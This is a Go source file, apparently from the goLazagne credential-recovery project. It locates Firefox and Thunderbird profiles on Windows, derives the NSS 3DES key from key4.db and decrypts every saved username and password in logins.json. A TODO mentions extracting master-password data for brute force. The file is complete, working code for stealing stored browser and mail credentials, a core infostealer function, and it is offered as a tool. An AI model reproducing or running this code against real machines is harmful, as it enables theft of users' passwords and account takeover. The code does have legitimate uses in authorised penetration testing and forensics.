package browsers

import (
	"bufio"
	"bytes"
	"crypto/cipher"
	"crypto/des"
	"crypto/hmac"
	"crypto/sha1"
	"database/sql"
	"encoding/asn1"
	"encoding/base64"
	"encoding/json"
	"github.com/kerbyj/goLazagne/common"
	_ "github.com/mattn/go-sqlite3"
	"io/ioutil"
	"log"
	"os"
	"strings"
)

var (
	mozillaPathsUserData = []AppInfo{
		{"FF", common.AppData + "\\Mozilla\\Firefox"},
		{"TB", common.AppData + "\\Thunderbird"},
	}
)

type AppInfo struct {
	name string
	path string
}

//Структуры для asn1.Unmarshal
type AsnSourceDataMasterPassword struct {
	Data struct {
		ObjIdent asn1.ObjectIdentifier
		Data     struct {
			Entry []byte
			P     int
		}
	}
	EncryptedPasswdCheck []byte
}

type AsnLoginData struct {
	KeyId    []byte
	SomeInfo struct {
		ObjIdent asn1.ObjectIdentifier
		Lv       []byte
	}
	CipherText []byte
}

//Login storage struct
type MozillaLogins struct {
	Logins []struct {
		Hostname          string `json:"hostname"`
		EncryptedUsername string `json:"encryptedUsername"`
		EncryptedPassword string `json:"encryptedPassword"`
	} `json:"logins"`
}

//Ecnrypted login with IV
type decodedLogindata struct {
	keyId      []byte
	Iv         []byte
	cipherText []byte
}

//Unencrypted data
type mozillaLoginData struct {
	userName decodedLogindata
	passWord decodedLogindata
	hostname string
}

func calculateHmac(key, message []byte) []byte {
	var hm = hmac.New(sha1.New, key)
	hm.Write(message)
	return hm.Sum(nil)
}

func tripleDesDecrypt(crypted, key, iv []byte) []byte {
	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return nil
	}
	blockMode := cipher.NewCBCDecrypter(block, iv)
	origData := make([]byte, len(crypted))
	blockMode.CryptBlocks(origData, crypted)
	return origData
}

//Collect data and decrypt
func mozillaDecrypt3DES(globalSalt, master_password string, entrySalt, encryptedPasswd []byte) []byte {
	var (
		hp    = sha1.Sum([]byte(globalSalt))
		count = 20 - len(entrySalt)
		adder []byte
	)
	for i := 0; i < count; i++ {
		adder = append(adder, 0x00)
	}
	var (
		pes = append(entrySalt, adder...)
		chp = sha1.Sum(append(hp[:], entrySalt...))
		k1  = calculateHmac(chp[:], append(pes, entrySalt...))
		tk  = calculateHmac(chp[:], pes)
		k2  = calculateHmac(chp[:], append(tk, entrySalt...))

		k   = append(k1, k2...)
		iv  = k[len(k)-8:]
		key = k[:24]

		data = tripleDesDecrypt(encryptedPasswd, key, iv)
	)
	return data
}

//Check data correctness
func mozillaIsMasterPasswordCorrect(item1, item2 string) (string, string, string) {

	var sourceData AsnSourceDataMasterPassword
	var _, err1 = asn1.Unmarshal([]byte(item2), &sourceData)
	if err1 != nil {
		log.Println(err1.Error())
	}
	var (
		globalSalt                = item1
		encryptedPasswordCheck    = sourceData.EncryptedPasswdCheck
		entrySaltForPasswordCheck = sourceData.Data.Data.Entry
		her                       = []byte{0x00, 0x00}
		check                     = []byte("password-check")
	)
	check = append(check, her...)
	var cleartext = mozillaDecrypt3DES(globalSalt, "", entrySaltForPasswordCheck, encryptedPasswordCheck)
	if bytes.Equal(cleartext, check) {
		return "", "", ""
	} else {
		return globalSalt, "", string(entrySaltForPasswordCheck)
	}
}

//Key data - item1, item2
func mozillaManageMasterPassword(item1, item2 string) (string, string, string, bool) {
	var globalSalt, masterPassword, entrySalt = mozillaIsMasterPasswordCorrect(item1, item2)
	if globalSalt == "" {
		log.Println("Master password is used") //TODO data extraction for brute force
		return "", "", "", false
	}
	return globalSalt, masterPassword, entrySalt, true
}

func getMozillaKey(profilePath string, app string) []byte {
	db, err := sql.Open("sqlite3", profilePath+"\\key4.db")
	if err != nil {
		return nil
	}
	rows, err := db.Query("SELECT item1, item2 FROM metadata WHERE id = 'password';")
	var item1, item2 string
	if err != nil {
		return nil
	}
	for rows.Next() {
		err := rows.Scan(&item1, &item2)
		if err != nil {
			return nil
		}

		var globalSalt, _, _, status = mozillaManageMasterPassword(item1, item2)

		if !status {
			// Сработает в случае использования master password для FF
			return nil
		}

		if globalSalt != "" {
			rows2, _ := db.Query("SELECT a11,a102 FROM nssPrivate;")
			var all, a102 string
			rows2.Next()
			rows2.Scan(&all, &a102)

			var sourceData AsnSourceDataMasterPassword
			asn1.Unmarshal([]byte(all), &sourceData)

			var entrySalt = sourceData.Data.Data.Entry
			var cipherT = sourceData.EncryptedPasswdCheck
			var key = mozillaDecrypt3DES(globalSalt, "", entrySalt, cipherT)
			//log.Println(key)
			return key
		}
	}

	return nil
}

func getFirefoxProfiles(path string) []string {
	fileWithUserData, _ := os.Open(path + "\\profiles.ini")
	scanner := bufio.NewScanner(fileWithUserData)

	var profilesPath []string
	for scanner.Scan() {
		var line = scanner.Text()
		if len(line) < 5 {
			continue
		}
		if line[:4] == "Path" {
			profilesPath = append(profilesPath, path+"\\"+strings.Replace(strings.Split(line, "=")[1], "/", "\\", 1))
		}
	}
	return profilesPath
}

func mozillaDecodeLoginData(data string) decodedLogindata {
	var nudeData, _ = base64.StdEncoding.DecodeString(data)
	var sourceData AsnLoginData
	asn1.Unmarshal(nudeData, &sourceData)
	var returned = decodedLogindata{sourceData.KeyId, sourceData.SomeInfo.Lv, sourceData.CipherText}

	return returned
}

func mozillaGetLoginData(profile string) []mozillaLoginData {
	_, err := sql.Open("sqlite3", profile+"\\signons.sqlite")
	if err != nil {
		return nil
	}
	var file, errFile = ioutil.ReadFile(profile + "\\logins.json")
	if errFile != nil {
		return nil
	}

	var logins MozillaLogins
	var LoginsList []mozillaLoginData
	json.Unmarshal(file, &logins)
	for i := range logins.Logins {
		var (
			encUserName = mozillaDecodeLoginData(logins.Logins[i].EncryptedUsername)
			encPassword = mozillaDecodeLoginData(logins.Logins[i].EncryptedPassword)
			hostname    = logins.Logins[i].Hostname
		)
		LoginsList = append(LoginsList, mozillaLoginData{encUserName, encPassword, hostname})
	}
	return LoginsList
}

func mozillaModuleStart(data AppInfo) ([]common.UrlNamePass, bool) {
	if _, err := os.Stat(data.path); err == nil {
		var profiles = getFirefoxProfiles(data.path)
		for i := range profiles {
			var (
				key         = getMozillaKey(profiles[i], data.name)
				credentials = mozillaGetLoginData(profiles[i])
			)
			if len(key) > 24 {
				key = key[:24]
			}

			if len(credentials) == 0 || len(key) == 0 || key == nil {
				return nil, false
			}
			var credentialsData []common.UrlNamePass
			for j := range credentials {
				var (
					loginWithTrash    = tripleDesDecrypt(credentials[j].userName.cipherText, key, credentials[j].userName.Iv)
					passwordWithTrash = tripleDesDecrypt(credentials[j].passWord.cipherText, key, credentials[j].passWord.Iv)
				)

				if len(loginWithTrash) == 0 || len(passwordWithTrash) == 0 {
					continue
				}
				var (
					loginLength    = len(loginWithTrash)
					passwordLength = len(passwordWithTrash)
					login          = string(loginWithTrash[:loginLength-int(loginWithTrash[loginLength-1])])
					password       = string(passwordWithTrash[:passwordLength-int(passwordWithTrash[passwordLength-1])])
				)
				if data.name == "TB" {
					credentials[j].hostname = "mail"
				}
				credentialsData = append(credentialsData, common.UrlNamePass{credentials[j].hostname, login, password})
			}
			return credentialsData, true
		}
	}
	return nil, false
}

func MozillaExtractDataRun() common.ExtractCredentialsResult {
	var Result common.ExtractCredentialsResult
	var EmptyResult = common.ExtractCredentialsResult{false, Result.Data}

	for i := range mozillaPathsUserData {
		if _, err := os.Stat(mozillaPathsUserData[i].path); err == nil {
			var data, success = mozillaModuleStart(mozillaPathsUserData[i])
			if success {
				Result.Data = append(Result.Data, data...)
			}
		}
	}
	if len(Result.Data) == 0 {
		return EmptyResult
	} else {
		Result.Success = true
		return Result
	}
}
